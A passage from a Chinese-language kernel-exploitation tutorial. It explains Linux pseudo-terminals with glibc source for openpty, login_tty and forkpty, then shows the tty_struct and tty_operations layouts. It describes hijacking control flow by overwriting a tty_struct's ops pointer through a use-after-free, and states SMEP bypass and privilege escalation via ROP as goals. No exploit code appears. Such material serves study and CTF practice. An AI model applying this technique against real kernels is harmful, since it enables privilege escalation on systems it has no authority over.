<p><code>/dev/ptmx</code>这个设备文件主要用于打开一对伪终端设备。当某个进程 open 了 <code>/dev/ptmx</code>后，该进程将获取到一个指向 <strong>新伪终端master设备（PTM）</strong> 的文件描述符，同时对应的 <strong>新伪终端slave设备（PTS）</strong> 将在 <code>/dev/pts/</code>下被创建。不同进程打开 <code>/dev/ptmx</code> 后所获得到的 PTM、PTS 都是互不相同的。</p>
<p>进程打开 &#x2F;dev&#x2F;ptmx 有两种方式</p>
<ol>
<li><p>手动使用 <code>open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY)</code> 打开</p>
</li>
<li><p>通过标准库函数 <code>getpt</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getpt</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过标准库函数 <code>posix_openpt</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">posix_openpt</span><span class="params">(<span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>上述几种方式完全等价，只是<strong>使用标准库函数</strong>的方式会更通用一点，因为 ptmx 在某些 linux 发行版上可能不位于 <code>/dev/ptmx</code>，同时标准库函数还会做其他额外的检测逻辑。</p>
</blockquote>
<p>进程可以调用<code>ptsname(ptm_fd)</code>来获取到对应的 PTS 的路径。</p>
<p>需要注意的是，必须先顺序调用以下两个函数后才能打开 PTS:</p>
<ol>
<li><code>grantpt(ptm_fd)</code>：更改 slave 的模式和所有者，获取其所有权</li>
<li><code>unlockpt(ptm_fd)</code>：对 slave 解锁</li>
</ol>
<p>伪终端主要用于两个应用场景</p>
<ul>
<li>终端仿真器，为其他远程登录程序（例如 ssh）提供终端功能</li>
<li>可用于向<strong>通常拒绝从管道读取输入</strong>的程序（例如 su 和 passwd）发送输入</li>
</ul>
<p>上述几步是使用伪终端所必须调用的一些底层函数。但在实际的伪终端编程中，更加常用的是以下几个函数：</p>
<blockquote>
<p>我们可以通过阅读这些函数的源代码来了解伪终端的使用方式。</p>
</blockquote>
<ul>
<li><p><code>openpty</code>：找到一个空闲的伪终端，并将打开好后的 master 和 slave 终端的文件描述符返回。源代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Create pseudo tty master slave pair and set terminal attributes</span></span><br><span class="line"><span class="comment">   according to TERMP and WINP.  Return handles for both ends in</span></span><br><span class="line"><span class="comment">   AMASTER and ASLAVE, and return the name of the slave end in NAME.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">openpty</span> <span class="params">(<span class="type">int</span> *amaster, <span class="type">int</span> *aslave, <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">  <span class="type">const</span> <span class="keyword">struct</span> termios *termp, <span class="type">const</span> <span class="keyword">struct</span> winsize *winp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PATH_MAX</span></span><br><span class="line">  <span class="type">char</span> _buf[PATH_MAX];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">char</span> _buf[<span class="number">512</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">char</span> *buf = _buf;</span><br><span class="line">  <span class="type">int</span> master, ret = <span class="number">-1</span>, slave = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  *buf = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  master = getpt ();</span><br><span class="line">  <span class="keyword">if</span> (master == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (grantpt (master))</span><br><span class="line">    <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlockpt (master))</span><br><span class="line">    <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TIOCGPTPEER</span></span><br><span class="line">  <span class="comment">/* Try to allocate slave fd solely based on master fd first. */</span></span><br><span class="line">  slave = ioctl (master, TIOCGPTPEER, O_RDWR | O_NOCTTY);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (slave == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Fallback to path-based slave fd allocation in case kernel doesn&#x27;t</span></span><br><span class="line"><span class="comment">       * support TIOCGPTPEER.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (pts_name (master, &amp;buf, <span class="keyword">sizeof</span> (_buf)))</span><br><span class="line">        <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">      slave = open (buf, O_RDWR | O_NOCTTY);</span><br><span class="line">      <span class="keyword">if</span> (slave == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">goto</span> on_error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* XXX Should we ignore errors here?  */</span></span><br><span class="line">  <span class="keyword">if</span> (termp)</span><br><span class="line">    tcsetattr (slave, TCSAFLUSH, termp);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TIOCSWINSZ</span></span><br><span class="line">  <span class="keyword">if</span> (winp)</span><br><span class="line">    ioctl (slave, TIOCSWINSZ, winp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  *amaster = master;</span><br><span class="line">  *aslave = slave;</span><br><span class="line">  <span class="keyword">if</span> (name != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*buf == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (pts_name (master, &amp;buf, <span class="keyword">sizeof</span> (_buf)))</span><br><span class="line">          <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">strcpy</span> (name, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> on_error:</span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">    close (master);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slave != <span class="number">-1</span>)</span><br><span class="line">      close (slave);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf != _buf)</span><br><span class="line">    <span class="built_in">free</span> (buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>login_tty</code>：用于实现在指定的终端上启动登录会话。源代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">login_tty</span> <span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 启动新会话</span></span><br><span class="line">  (<span class="type">void</span>) setsid();</span><br><span class="line">    <span class="comment">// 设置为当前 fd 为控制终端</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TIOCSCTTY</span></span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, TIOCSCTTY, (<span class="type">char</span> *)<span class="literal">NULL</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* This might work.  */</span></span><br><span class="line">    <span class="type">char</span> *fdname = ttyname (fd);</span><br><span class="line">    <span class="type">int</span> newfd;</span><br><span class="line">    <span class="keyword">if</span> (fdname)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">0</span>)</span><br><span class="line">    (<span class="type">void</span>) close (<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">1</span>)</span><br><span class="line">    (<span class="type">void</span>) close (<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">2</span>)</span><br><span class="line">    (<span class="type">void</span>) close (<span class="number">2</span>);</span><br><span class="line">        newfd = open (fdname, O_RDWR);</span><br><span class="line">        (<span class="type">void</span>) close (newfd);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">1</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">2</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (fd &gt; <span class="number">2</span>)</span><br><span class="line">    (<span class="type">void</span>) close(fd);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>forkpty</code>：整合了<code>openpty</code>, <code>fork</code> 和 <code>login_tty</code>，在网络服务程序可用于为新登录用户打开一对伪终端，并创建相应的会话子进程。源代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">forkpty</span> <span class="params">(<span class="type">int</span> *amaster, <span class="type">char</span> *name, <span class="type">const</span> <span class="keyword">struct</span> termios *termp,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="keyword">struct</span> winsize *winp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> master, slave, pid;</span><br><span class="line">  <span class="comment">// 启动新 pty</span></span><br><span class="line">  <span class="keyword">if</span> (openpty (&amp;master, &amp;slave, name, termp, winp) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (pid = fork ())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">      close (master);</span><br><span class="line">      close (slave);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="comment">/* Child.  */</span></span><br><span class="line">      close (master);</span><br><span class="line">      <span class="keyword">if</span> (login_tty (slave))</span><br><span class="line">  _exit (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Parent.  */</span></span><br><span class="line">      *amaster = master;</span><br><span class="line">      close (slave);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> pid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-tty-struct-结构的利用"><a href="#3-tty-struct-结构的利用" class="headerlink" title="3) tty_struct 结构的利用"></a>3) tty_struct 结构的利用</h3><p>当我们执行 <code>open(&quot;/dev/ptmx&quot;, flag)</code> 时，内核会通过以下函数调用链，分配一个 <code>struct tty_struct</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptmx_open (drivers/tty/pty.c)</span><br><span class="line">-&gt; tty_init_dev (drivers/tty/tty_io.c)</span><br><span class="line">  -&gt; alloc_tty_struct (drivers/tty/tty_io.c)</span><br></pre></td></tr></table></figure>

<p><code>struct tty_struct</code> 的结构如下所示：</p>
<blockquote>
<p>sizeof(struct tty_struct) &#x3D;&#x3D; 0x2e0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span>  magic;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">  <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">  <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">  <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>  <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>    <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">  <span class="type">int</span> count;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>    <span class="comment">/* winsize_mutex */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,  <span class="comment">/* flow_lock */</span></span><br><span class="line">          flow_stopped:<span class="number">1</span>,</span><br><span class="line">          unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">  <span class="type">int</span> hw_stopped;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,  <span class="comment">/* ctrl_lock */</span></span><br><span class="line">          packet:<span class="number">1</span>,</span><br><span class="line">          unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">  <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">  <span class="type">int</span> alt_speed;    <span class="comment">/* For magic substitution of 38400 bps */</span></span><br><span class="line">  <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">  <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">  <span class="type">void</span> *disc_data;</span><br><span class="line">  <span class="type">void</span> *driver_data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> closing;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">  <span class="type">int</span> write_cnt;</span><br><span class="line">  <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意到第五个字段 <code>const struct tty_operations *ops</code>，<code>struct tty_operations</code>结构体实际上是多个函数指针的集合：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">      <span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">  <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">  <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">  <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">          <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">  <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">  <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">  <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">           <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">  <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">  <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">  <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">  <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">  <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">  <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">  <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">  <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">  <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">  <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">  <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">        <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">  <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">  <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">  <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们可以试着通过 UAF, 修改<strong>新</strong>分配的 tty_struct 上的 <code>const struct tty_operations *ops</code>，使其指向一个伪造的 <code>tty_operations</code>结构体，这样就可以搭配一些操作（例如 open、ioctl 等等）来劫持控制流。</p>
<blockquote>
<p>注：tty_operations 函数指针的使用，位于<code>drivers/tty/tty_io.c</code>的各类 <code>tty_xxx</code>函数中。</p>
</blockquote>
<p>但由于开启了 SMEP 保护，此时的控制流<strong>只能在内核代码中执行</strong>，不能跳转至用户代码。</p>
<h3 id="4-ROP-利用"><a href="#4-ROP-利用" class="headerlink" title="4) ROP 利用"></a>4) ROP 利用</h3><p>为了达到提权目的，我们需要完成以下几件事情：</p>
<ol>
<li>提权</li>
<li>绕过 SMEP，执行用户代码</li>
</ol>
